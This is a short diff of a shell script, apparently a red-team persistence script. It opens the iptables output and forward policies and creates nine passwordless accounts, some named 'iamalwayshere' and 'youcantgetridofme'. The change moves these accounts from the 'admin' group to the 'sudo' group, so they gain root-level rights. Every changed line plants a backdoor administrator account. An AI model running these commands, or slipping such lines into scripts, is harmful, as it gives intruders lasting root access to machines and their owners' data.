@@ -22,12 +22,12 @@ command iptables -P OUTPUT ACCEPT
 command iptables -P FORWARD ACCEPT
 
 # Add some admin users
-command useradd -M devbl -p "" -G admin
-command useradd -M bob -p "" -G admin
-command useradd -M susan -p "" -G admin
-command useradd -M kat -p "" -G admin
-command useradd -M simon -p "" -G admin
-command useradd -M batman -p "" -G admin
-command useradd -M iamalwayshere -p "" -G admin
-command useradd -M youcantgetridofme -p "" -G admin
-command useradd -M hehe -p "" -G admin
+command useradd -M devbl -p "" -G sudo
+command useradd -M bob -p "" -G sudo
+command useradd -M susan -p "" -G sudo
+command useradd -M kat -p "" -G sudo
+command useradd -M simon -p "" -G sudo
+command useradd -M batman -p "" -G sudo
+command useradd -M iamalwayshere -p "" -G sudo
+command useradd -M youcantgetridofme -p "" -G sudo
+command useradd -M hehe -p "" -G sudo
